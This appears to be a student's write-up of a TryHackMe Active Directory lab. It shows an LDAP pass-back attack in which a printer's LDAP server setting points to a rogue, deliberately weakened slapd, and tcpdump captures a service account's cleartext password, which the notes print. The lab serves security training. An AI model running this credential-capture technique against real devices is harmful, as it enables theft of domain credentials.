From: https://tryhackme.com/room/breachingad

We have a print server where we can set the ldap server to our ip:
![[Images/Pasted image 20250306170957.png]]

We confirm that we get the connection when pressing Test Settings:
```sh
┌──(kali㉿kali)-[~/thm/breaching-ad]
└─$ nc -nvlp 389             
listening on [any] 389 ...
connect to [10.50.79.21] from (UNKNOWN) [10.200.80.201] 60549
0�Dc�;

x�
  objectclass0�supportedCapabilities0�P0�Fc�=

x�
  objectclass0�supportedSASLMechanisms0�P
qwe
```

(This requires slapd and ldap-utils to be installed.)

Configure slapd to be unsecure
```sh
┌──(kali㉿kali)-[~/thm/breaching-ad]
└─$ sudo systemctl enable slapd          
Synchronizing state of slapd.service with SysV service script with /usr/lib/systemd/systemd-sysv-install.
Executing: /usr/lib/systemd/systemd-sysv-install enable slapd
Created symlink '/etc/systemd/system/multi-user.target.wants/slapd.service' → '/usr/lib/systemd/system/slapd.service'.

┌──(kali㉿kali)-[~/thm/breaching-ad]
└─$ sudo dpkg-reconfigure -p low slapd
  Backing up /etc/ldap/slapd.d in /var/backups/slapd-2.6.9+dfsg-1... done.
  Moving old database directory to /var/backups:
  - directory unknown... done.
  Creating initial configuration... done.
  Creating LDAP directory... done.

┌──(kali㉿kali)-[~/thm/breaching-ad]
└─$ nano olcSaslSecProps.ldif
```

`olcSaslSecProps.ldif`
```sh
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

```sh
┌──(kali㉿kali)-[~/thm/breaching-ad]
└─$ sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif 
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "cn=config"

┌──(kali㉿kali)-[~/thm/breaching-ad]
└─$ sudo service slapd restart 
```

```sh
┌──(kali㉿kali)-[~/thm/breaching-ad]
└─$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
dn:
supportedSASLMechanisms: LOGIN
supportedSASLMechanisms: PLAIN
```
1. **`-H ldap://`**: Specifies the LDAP URI (in this case, using the LDAP protocol without TLS or SSL).
2. **`-x`**: Uses simple authentication instead of SASL (anonymous bind in this case).
3. **`-LLL`**: Outputs results in a cleaner format (LDIF without comments or version information).
4. **`-s base`**: Performs a _base_ search, querying only the root DSE (directory server entry point).
5. **`-b ""`**: Sets the search base to the root DSE (empty base DN).
6. **`supportedSASLMechanisms`**: Requests a list of SASL mechanisms supported by the LDAP server.
This command queries the LDAP server's root DSE and lists the SASL authentication mechanisms it supports (e.g., `PLAIN`, `DIGEST-MD5`, `GSSAPI`).

Let's listen and send a test from the printer configuration page
```sh
┌──(kali㉿kali)-[~/thm/breaching-ad]
└─$ sudo tcpdump -SX -i breachad tcp port 389
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on breachad, link-type RAW (Raw IP), snapshot length 262144 bytes
16:50:46.859225 IP 10.200.80.201.60008 > 10.50.79.21.ldap: Flags [SEW], seq 3086522082, win 64240, options [mss 1289,nop,wscale 8,nop,nop,sackOK], length 0
        0x0000:  4502 0034 011b 4000 7f06 45cf 0ac8 50c9  E..4..@...E...P.
        0x0010:  0a32 4f15 ea68 0185 b7f8 96e2 0000 0000  .2O..h..........
        0x0020:  80c2 faf0 8469 0000 0204 0509 0103 0308  .....i..........
        0x0030:  0101 0402                                ....
16:50:46.859242 IP 10.50.79.21.ldap > 10.200.80.201.60008: Flags [S.], seq 3636629822, ack 3086522083, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
        0x0000:  4500 0034 0000 4000 4006 85ec 0a32 4f15  E..4..@.@....2O.
        0x0010:  0ac8 50c9 0185 ea68 d8c2 913e b7f8 96e3  ..P....h...>....
        0x0020:  8012 faf0 1a6d 0000 0204 05b4 0101 0402  .....m..........
        0x0030:  0103 0307                                ....
16:50:46.895432 IP 10.200.80.201.60008 > 10.50.79.21.ldap: Flags [.], ack 3636629823, win 1027, length 0
        0x0000:  4500 0028 011c 4000 7f06 45dc 0ac8 50c9  E..(..@...E...P.
        0x0010:  0a32 4f15 ea68 0185 b7f8 96e3 d8c2 913f  .2O..h.........?
        0x0020:  5010 0403 522d 0000                      P...R-..
16:50:46.895471 IP 10.200.80.201.60008 > 10.50.79.21.ldap: Flags [P.], seq 3086522083:3086522157, ack 3636629823, win 1027, length 74
        0x0000:  4500 0072 011d 4000 7f06 4591 0ac8 50c9  E..r..@...E...P.
        0x0010:  0a32 4f15 ea68 0185 b7f8 96e3 d8c2 913f  .2O..h.........?
        0x0020:  5018 0403 01a0 0000 3084 0000 0044 0201  P.......0....D..
        0x0030:  1063 8400 0000 3b04 000a 0100 0a01 0002  .c....;.........
        0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
        0x0050:  636c 6173 7330 8400 0000 1704 1573 7570  class0.......sup
        0x0060:  706f 7274 6564 4361 7061 6269 6c69 7469  portedCapabiliti
        0x0070:  6573                                     es
16:50:46.895479 IP 10.50.79.21.ldap > 10.200.80.201.60008: Flags [.], ack 3086522157, win 502, length 0
        0x0000:  4500 0028 3d31 4000 4006 48c7 0a32 4f15  E..(=1@.@.H..2O.
        0x0010:  0ac8 50c9 0185 ea68 d8c2 913f b7f8 972d  ..P....h...?...-
        0x0020:  5010 01f6 53f0 0000                      P...S...
16:50:46.895786 IP 10.50.79.21.ldap > 10.200.80.201.60008: Flags [P.], seq 3636629823:3636629834, ack 3086522157, win 502, length 11
        0x0000:  4500 0033 3d32 4000 4006 48bb 0a32 4f15  E..3=2@.@.H..2O.
        0x0010:  0ac8 50c9 0185 ea68 d8c2 913f b7f8 972d  ..P....h...?...-
        0x0020:  5018 01f6 0d3b 0000 3009 0201 1064 0404  P....;..0....d..
        0x0030:  0030 00                                  .0.
16:50:46.895795 IP 10.50.79.21.ldap > 10.200.80.201.60008: Flags [P.], seq 3636629834:3636629848, ack 3086522157, win 502, length 14
        0x0000:  4500 0036 3d33 4000 4006 48b7 0a32 4f15  E..6=3@.@.H..2O.
        0x0010:  0ac8 50c9 0185 ea68 d8c2 914a b7f8 972d  ..P....h...J...-
        0x0020:  5018 01f6 0153 0000 300c 0201 1065 070a  P....S..0....e..
        0x0030:  0100 0400 0400                           ......
16:50:46.931185 IP 10.200.80.201.60008 > 10.50.79.21.ldap: Flags [.], ack 3636629848, win 1027, length 0
        0x0000:  4500 0028 011e 4000 7f06 45da 0ac8 50c9  E..(..@...E...P.
        0x0010:  0a32 4f15 ea68 0185 b7f8 972d d8c2 9158  .2O..h.....-...X
        0x0020:  5010 0403 51ca 0000                      P...Q...
16:50:46.931210 IP 10.200.80.201.60008 > 10.50.79.21.ldap: Flags [P.], seq 3086522157:3086522233, ack 3636629848, win 1027, length 76
        0x0000:  4500 0074 011f 4000 7f06 458d 0ac8 50c9  E..t..@...E...P.
        0x0010:  0a32 4f15 ea68 0185 b7f8 972d d8c2 9158  .2O..h.....-...X
        0x0020:  5018 0403 c6fa 0000 3084 0000 0046 0201  P.......0....F..
        0x0030:  1163 8400 0000 3d04 000a 0100 0a01 0002  .c....=.........
        0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
        0x0050:  636c 6173 7330 8400 0000 1904 1773 7570  class0.......sup
        0x0060:  706f 7274 6564 5341 534c 4d65 6368 616e  portedSASLMechan
        0x0070:  6973 6d73                                isms
16:50:46.931359 IP 10.50.79.21.ldap > 10.200.80.201.60008: Flags [P.], seq 3636629848:3636629902, ack 3086522233, win 502, length 54
        0x0000:  4500 005e 3d34 4000 4006 488e 0a32 4f15  E..^=4@.@.H..2O.
        0x0010:  0ac8 50c9 0185 ea68 d8c2 9158 b7f8 9779  ..P....h...X...y
        0x0020:  5018 01f6 75df 0000 3034 0201 1164 2f04  P...u...04...d/.
        0x0030:  0030 2b30 2904 1773 7570 706f 7274 6564  .0+0)..supported
        0x0040:  5341 534c 4d65 6368 616e 6973 6d73 310e  SASLMechanisms1.
        0x0050:  0405 4c4f 4749 4e04 0550 4c41 494e       ..LOGIN..PLAIN
16:50:46.931368 IP 10.50.79.21.ldap > 10.200.80.201.60008: Flags [P.], seq 3636629902:3636629916, ack 3086522233, win 502, length 14
        0x0000:  4500 0036 3d35 4000 4006 48b5 0a32 4f15  E..6=5@.@.H..2O.
        0x0010:  0ac8 50c9 0185 ea68 d8c2 918e b7f8 9779  ..P....h.......y
        0x0020:  5018 01f6 ffc2 0000 300c 0201 1165 070a  P.......0....e..
        0x0030:  0100 0400 0400                           ......
16:50:46.966668 IP 10.200.80.201.60008 > 10.50.79.21.ldap: Flags [.], ack 3636629916, win 1026, length 0
        0x0000:  4500 0028 0120 4000 7f06 45d8 0ac8 50c9  E..(..@...E...P.
        0x0010:  0a32 4f15 ea68 0185 b7f8 9779 d8c2 919c  .2O..h.....y....
        0x0020:  5010 0402 513b 0000                      P...Q;..
16:50:46.967661 IP 10.200.80.201.60008 > 10.50.79.21.ldap: Flags [P.], seq 3086522233:3086522307, ack 3636629916, win 1026, length 74
        0x0000:  4500 0072 0121 4000 7f06 458d 0ac8 50c9  E..r.!@...E...P.
        0x0010:  0a32 4f15 ea68 0185 b7f8 9779 d8c2 919c  .2O..h.....y....
        0x0020:  5018 0402 fead 0000 3084 0000 0044 0201  P.......0....D..
        0x0030:  1263 8400 0000 3b04 000a 0100 0a01 0002  .c....;.........
        0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
        0x0050:  636c 6173 7330 8400 0000 1704 1573 7570  class0.......sup
        0x0060:  706f 7274 6564 4361 7061 6269 6c69 7469  portedCapabiliti
        0x0070:  6573                                     es
16:50:46.967804 IP 10.50.79.21.ldap > 10.200.80.201.60008: Flags [P.], seq 3636629916:3636629927, ack 3086522307, win 502, length 11
        0x0000:  4500 0033 3d36 4000 4006 48b7 0a32 4f15  E..3=6@.@.H..2O.
        0x0010:  0ac8 50c9 0185 ea68 d8c2 919c b7f8 97c3  ..P....h........
        0x0020:  5018 01f6 0a48 0000 3009 0201 1264 0404  P....H..0....d..
        0x0030:  0030 00                                  .0.
16:50:46.967814 IP 10.50.79.21.ldap > 10.200.80.201.60008: Flags [P.], seq 3636629927:3636629941, ack 3086522307, win 502, length 14
        0x0000:  4500 0036 3d37 4000 4006 48b3 0a32 4f15  E..6=7@.@.H..2O.
        0x0010:  0ac8 50c9 0185 ea68 d8c2 91a7 b7f8 97c3  ..P....h........
        0x0020:  5018 01f6 fe5f 0000 300c 0201 1265 070a  P...._..0....e..
        0x0030:  0100 0400 0400                           ......
16:50:47.003431 IP 10.200.80.201.60008 > 10.50.79.21.ldap: Flags [.], ack 3636629941, win 1026, length 0
        0x0000:  4500 0028 0122 4000 7f06 45d6 0ac8 50c9  E..(."@...E...P.
        0x0010:  0a32 4f15 ea68 0185 b7f8 97c3 d8c2 91b5  .2O..h..........
        0x0020:  5010 0402 50d8 0000                      P...P...
16:50:47.003458 IP 10.200.80.201.60008 > 10.50.79.21.ldap: Flags [P.], seq 3086522307:3086522373, ack 3636629941, win 1026, length 66
        0x0000:  4500 006a 0123 4000 7f06 4593 0ac8 50c9  E..j.#@...E...P.
        0x0010:  0a32 4f15 ea68 0185 b7f8 97c3 d8c2 91b5  .2O..h..........
        0x0020:  5018 0402 6d2b 0000 3084 0000 003c 0201  P...m+..0....<..
        0x0030:  1360 8400 0000 3302 0103 0404 4e54 4c4d  .`....3.....NTLM
        0x0040:  8a28 4e54 4c4d 5353 5000 0100 0000 0782  .(NTLMSSP.......
        0x0050:  08a2 0000 0000 0000 0000 0000 0000 0000  ................
        0x0060:  0000 0a00 6345 0000 000f                 ....cE....
16:50:47.003604 IP 10.50.79.21.ldap > 10.200.80.201.60008: Flags [P.], seq 3636629941:3636629965, ack 3086522373, win 502, length 24
        0x0000:  4500 0040 3d38 4000 4006 48a8 0a32 4f15  E..@=8@.@.H..2O.
        0x0010:  0ac8 50c9 0185 ea68 d8c2 91b5 b7f8 9805  ..P....h........
        0x0020:  5018 01f6 fe2b 0000 3016 0201 1361 110a  P....+..0....a..
        0x0030:  0122 0400 040a 696e 7661 6c69 6420 444e  ."....invalid.DN
16:50:47.048201 IP 10.200.80.201.60009 > 10.50.79.21.ldap: Flags [SEW], seq 3441890482, win 64240, options [mss 1289,nop,wscale 8,nop,nop,sackOK], length 0
        0x0000:  4502 0034 0124 4000 7f06 45c6 0ac8 50c9  E..4.$@...E...P.
        0x0010:  0a32 4f15 ea69 0185 cd27 14b2 0000 0000  .2O..i...'......
        0x0020:  80c2 faf0 f169 0000 0204 0509 0103 0308  .....i..........
        0x0030:  0101 0402                                ....
16:50:47.048225 IP 10.50.79.21.ldap > 10.200.80.201.60009: Flags [S.], seq 421522833, ack 3441890483, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
        0x0000:  4500 0034 0000 4000 4006 85ec 0a32 4f15  E..4..@.@....2O.
        0x0010:  0ac8 50c9 0185 ea69 191f ed91 cd27 14b3  ..P....i.....'..
        0x0020:  8012 faf0 eabd 0000 0204 05b4 0101 0402  ................
        0x0030:  0103 0307                                ....
16:50:47.080333 IP 10.200.80.201.60008 > 10.50.79.21.ldap: Flags [.], ack 3636629965, win 1026, length 0
        0x0000:  4500 0028 0125 4000 7f06 45d3 0ac8 50c9  E..(.%@...E...P.
        0x0010:  0a32 4f15 ea68 0185 b7f8 9805 d8c2 91cd  .2O..h..........
        0x0020:  5010 0402 507e 0000                      P...P~..
16:50:47.083519 IP 10.200.80.201.60009 > 10.50.79.21.ldap: Flags [.], ack 421522834, win 1027, length 0
        0x0000:  4500 0028 0126 4000 7f06 45d2 0ac8 50c9  E..(.&@...E...P.
        0x0010:  0a32 4f15 ea69 0185 cd27 14b3 191f ed92  .2O..i...'......
        0x0020:  5010 0403 227e 0000                      P..."~..
16:50:47.083589 IP 10.200.80.201.60009 > 10.50.79.21.ldap: Flags [P.], seq 3441890483:3441890548, ack 421522834, win 1027, length 65
        0x0000:  4500 0069 0127 4000 7f06 4590 0ac8 50c9  E..i.'@...E...P.
        0x0010:  0a32 4f15 ea69 0185 cd27 14b3 191f ed92  .2O..i...'......
        0x0020:  5018 0403 4398 0000 3084 0000 003b 0201  P...C...0....;..
        0x0030:  1460 8400 0000 3202 0102 0418 7a61 2e74  .`....2.....za.t
        0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ryhackme.com\svc
        0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..tryhackmel
        0x0060:  6461 7070 6173 7331 40                   dappass1@
16:50:47.083601 IP 10.50.79.21.ldap > 10.200.80.201.60009: Flags [.], ack 3441890548, win 502, length 0
        0x0000:  4500 0028 d350 4000 4006 b2a7 0a32 4f15  E..(.P@.@....2O.
        0x0010:  0ac8 50c9 0185 ea69 191f ed92 cd27 14f4  ..P....i.....'..
        0x0020:  5010 01f6 244a 0000                      P...$J..
16:50:47.084042 IP 10.50.79.21.ldap > 10.200.80.201.60009: Flags [P.], seq 421522834:421522858, ack 3441890548, win 502, length 24
        0x0000:  4500 0040 d351 4000 4006 b28e 0a32 4f15  E..@.Q@.@....2O.
        0x0010:  0ac8 50c9 0185 ea69 191f ed92 cd27 14f4  ..P....i.....'..
        0x0020:  5018 01f6 ced3 0000 3016 0201 1461 110a  P.......0....a..
        0x0030:  0122 0400 040a 696e 7661 6c69 6420 444e  ."....invalid.DN
16:50:47.174894 IP 10.200.80.201.60009 > 10.50.79.21.ldap: Flags [.], ack 421522858, win 1027, length 0
        0x0000:  4500 0028 012a 4000 7f06 45ce 0ac8 50c9  E..(.*@...E...P.
        0x0010:  0a32 4f15 ea69 0185 cd27 14f4 191f edaa  .2O..i...'......
        0x0020:  5010 0403 2225 0000                      P..."%..
^C
26 packets captured
26 packets received by filter
0 packets dropped by kernel
```
    -S: Shows absolute TCP sequence numbers (instead of relative ones).
    -X: Displays packet contents in both hexadecimal and ASCII formats.
    -i breachad: Captures traffic on the breachad network interface.
    tcp port 389: Filters traffic to only capture TCP packets on port 389 (used by LDAP).
This command captures and displays LDAP traffic on port 389, useful for analyzing unencrypted LDAP communications.


The password is sent in clear text 
```sh
        0x0030:  1460 8400 0000 3202 0102 0418 7a61 2e74  .`....2.....za.t
        0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ryhackme.com\svc
        0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..tryhackmel
        0x0060:  6461 7070 6173 7331 40                   dappass1@
```

tryhackmeldappass1@
